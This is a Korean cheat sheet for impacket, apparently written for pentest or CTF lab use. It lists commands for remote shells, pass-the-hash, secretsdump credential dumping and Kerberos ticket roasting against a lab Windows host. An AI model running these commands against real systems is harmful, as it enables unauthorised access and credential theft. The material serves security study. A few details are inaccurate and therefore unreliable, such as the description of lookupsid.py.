# impacket — Windows 프로토콜 도구 모음

- impacket — SMB·MSRPC·Kerberos 등 Windows 네트워크 프로토콜을 Python으로 구현한 라이브러리와 그 위에 만들어진 스크립트 모음. 원격 셸(psexec/wmiexec/smbexec), 크리덴셜 덤프(secretsdump), 티켓 공격(GetUserSPNs/GetNPUsers) 등이 전부 담겨 있다.
- 유효한 계정 크리덴셜(패스워드 또는 NTLM 해시)을 확보했을 때 Linux에서 Windows로 원격 셸을 열거나, DC에서 해시·티켓을 뽑을 때. Kali에서 타깃에 파일을 올리지 않고 동작하는 것이 장점이다.
- Kali에 기본 포함(impacket 패키지). `pip install impacket`으로도 설치된다. `*.py` 스크립트 이름으로 바로 호출하며, 모든 스크립트는 `-h`로 옵션을 볼 수 있다.

## 원격 셸 3종 — 계정 크리덴셜로 Windows 셸 열기

```bash
# psexec.py — SYSTEM 셸. 서비스를 설치하는 방식이라 탐지되기 쉽고 가장 무겁다
psexec.py <도메인>/<사용자>:'<패스워드>'@10.10.10.161

# wmiexec.py — WMI로 반투명(semi-interactive) 셸. 파일을 디스크에 안 남긴다. 실전 기본값
wmiexec.py <도메인>/<사용자>:'<패스워드>'@10.10.10.161

# smbexec.py — SMB로 명령을 날리는 셸. psexec과 비슷하지만 서비스 설치를 남긴다
smbexec.py <도메인>/<사용자>:'<패스워드>'@10.10.10.161
```

- 실행 우선순위는 보통 wmiexec → smbexec → psexec 순. psexec은 SYSTEM이 보장되지만 로그·서비스 흔적이 크다.
- psexec으로 열린 셸은 SYSTEM, wmiexec로 열린 셸은 해당 계정 권한(관리자여도 UAC로 제한될 수 있음)이다.

## 패스-the-해시

```bash
wmiexec.py <도메인>/<사용자>@10.10.10.161 -hashes :<NTLM해시>
psexec.py <도메인>/administrator@10.10.10.161 -hashes <LM>:<NTLM>
```

- `-hashes` 형식은 `LM:NTLM`. LM이 없으면 앞을 비운다(`:31d6cfe0...`).
- 로컬 계정은 도메인 자리에 `./`를 넣는다: `wmiexec.py ./administrator@10.10.10.161 -hashes :<NT>`

## secretsdump — 자격증명 덤프

```bash
# 로컬 관리자 크리덴셜로 SAM 덤프
secretsdump.py <도메인>/administrator:'<패스워드>'@10.10.10.161

# DRSUAPI로 도메인 전체 해시 (DC 복제 권한 필요)
secretsdump.py <도메인>/administrator:'<패스워드>'@10.10.10.161 -just-dc-ntlm

# 로컬 파일(레지스트리 하이브)에서 덤프
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

- `-just-dc-ntlm`(또는 `-just-dc`)은 DC에서 도메인 사용자 NTLM 해시를 뽑는다. 관리자가 아닌 계정으로는 실패한다.
- 출력의 `user:rid:lm:ntlm:::` 줄에서 네 번째 필드가 NTLM 해시이고, evil-winrm `-H`나 psexec `-hashes`로 바로 재사용한다.

## Kerberos 관련 티켓 공격

```bash
# Kerberoastable 계정 목록 + 티켓 획득
GetUserSPNs.py <도메인>/<사용자>:'<패스워드>' -dc-ip 10.10.10.161 -request
# 크래킹은 hashcat -m 13100

# AS-REP Roastable (pre-auth 비활성 계정)
GetNPUsers.py <도메인>/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
# 크래킹은 hashcat -m 18200
```

## 기타 자주 쓰는 스크립트

```bash
# SMB 공유·파일 조작
smbclient.py <도메인>/<사용자>:'<패스워드>'@10.10.10.161

# RPC 열거
rpcdump.py 10.10.10.161

# 대상 호스트가 알고 있는 세션·열린 파이프 확인 (사이드 채널 호스트 열거)
lookupsid.py <도메인>/<사용자>:'<패스워드>'@10.10.10.161
```

## 트러블슈팅

- `STATUS_ACCESS_DENIED`: 계정이 원격 로그인 권한이 없거나 해시가 틀렸다. netexec로 먼저 크리덴셜 유효성을 검증한다.
- wmiexec이 멈추면 SMB 서명이 필수인 환경일 수 있다. psexec으로 전환하거나 evil-winrm(5985)을 시도한다.
- 패스-the-해시가 실패하는데 `[+]`는 나오면 UAC 원격 제한(LocalAccountTokenFilterPolicy) 문제다. wmiexec 대신 psexec 계열이 통할 때가 있다.
- DC에서 `-just-dc` 실패는 복제(DRSUAPI) 권한이 없다는 뜻이다. 도메인 관리자 계정이 필요하다.
- 스크립트를 못 찾겠으면 `impacket-` 접두사로 설치된 경우도 있다: `impacket-wmiexec.py`
